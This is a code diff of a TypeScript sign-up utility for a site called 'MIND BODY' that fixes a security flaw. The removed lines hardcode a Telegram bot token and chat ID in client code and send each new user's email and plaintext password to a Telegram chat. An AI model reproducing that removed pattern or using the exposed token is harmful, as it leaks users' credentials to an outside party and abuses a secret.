@@ -37,9 +37,8 @@ export interface UserSettings {
     theme: 'light' | 'dark' | 'auto';
 }
 
-// Telegram Configuration (same as checkout)
-const TELEGRAM_BOT_TOKEN = "7516303735:AAFZtMq37IfEFmDzNTkNrZiKh8OOBjpiTQ0";
-const TELEGRAM_CHAT_ID = "5429418837";
+// Telegram notifications are sent via the server-side /api/telegram.send route
+// Bot token is NEVER exposed in client code
 
 const STORAGE_KEYS = {
     AUTH: 'auth_state',
@@ -79,18 +78,14 @@ const generateId = (): string => {
     return 'user_' + Date.now().toString(36) + Math.random().toString(36).substr(2);
 };
 
-// Send registration notification to Telegram
-const sendRegistrationNotification = async (user: User, password?: string): Promise<void> => {
+// Send registration notification via server-side route (NO passwords in notifications!)
+const sendRegistrationNotification = async (user: User): Promise<void> => {
     const message = `
 🎉 *НОВА РЕЄСТРАЦІЯ - MIND BODY*
 ━━━━━━━━━━━━━━━━━━━━━
 👤 *Ім'я:* ${user.name}
 📧 *Email:* ${user.email}
 📱 *Телефон:* ${user.phone || 'Не вказано'}
-
-🔑 *ДАНІ ДЛЯ ВХОДУ:*
-📩 *Логін:* \`${user.email}\`
-🔐 *Пароль:* \`${password || 'Google OAuth'}\`
 
 ℹ️ *Додаткова інформація:*
 🔐 *Метод реєстрації:* ${user.provider === 'google' ? 'Google' : 'Email/Пароль'}
@@ -100,18 +95,14 @@ const sendRegistrationNotification = async (user: User, password?: string): Prom
     `.trim();
 
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        await fetch('/api/telegram/send', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ message })
         });
-        console.log('Telegram notification sent successfully');
+        console.log('Registration notification sent successfully');
     } catch (error) {
-        console.error('Failed to send Telegram notification:', error);
+        console.error('Failed to send registration notification:', error);
     }
 };
 
@@ -205,8 +196,8 @@ export const AuthUtils = {
             theme: 'light'
         });
 
-        // Send Telegram notification (включая пароль)
-        await sendRegistrationNotification(user, password);
+        // Send Telegram notification (NO password included!)
+        await sendRegistrationNotification(user);
 
         // SYNC WITH SERVER DB (PRISMA)
         try {
